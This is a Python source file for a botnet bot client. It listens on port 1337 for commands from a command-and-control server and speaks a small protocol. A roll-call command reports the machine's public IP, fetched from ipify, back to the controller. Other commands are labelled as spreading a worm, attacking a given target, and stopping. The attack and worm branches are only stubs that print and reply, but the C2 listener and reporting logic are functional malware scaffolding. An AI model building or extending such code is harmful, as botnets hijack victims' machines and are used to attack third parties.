# Client-side script for individual bots. Listens on port 1337 for messages
# from the CNC server.
# 
# Notes:
#   -   There isn't really a good way to get public facing ip addrs. Can use
#       the external service from ipify.
#       See: https://stackoverflow.com/questions/2311510/getting-a-machines-external-ip-address-with-python
#
import socket
from requests import get

ip = get('https://api.ipify.org').text  # get ip address from external service

HOST = '' # Will need to specify the CNC ip addr.
PORT = 1337

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.bind((HOST, PORT))
client.listen(1)
conn, addr = client.accept()

# Continuously listen on specified port for server commands.
while True:
    data = conn.recv(1024).decode('utf-8')

    if 'ATCK::0' in data:   # Spread the worm
        print(data)
        message = ('Spreading worm.').encode('utf-8')
        conn.send(message)
    elif 'HELO_S' in data:
        message = ('REDY').encode('utf-8')
        #message = 'BUSY'.encode('utf-8')
        conn.send(message)
    elif 'ROLL' in data:
        print(data)
        message = ('HELO_C::' + ip + '::' + str(PORT)).encode('utf-8')
        conn.send(message)
    elif 'ATCK::1' in data:
        print(data)
        message = ('Attacking: ' + data[9:]).encode('utf-8')
        conn.send(message)
    elif 'STOP' in data:
        print(data)
        message = ('Goodbye: ' + ip).encode('utf-8')
        conn.send(message)
    else:
        conn.send(b'BCMD')  # bad response?

    conn, addr = client.accept()
    client.listen(1)

print('Closing connection...')
client.close()
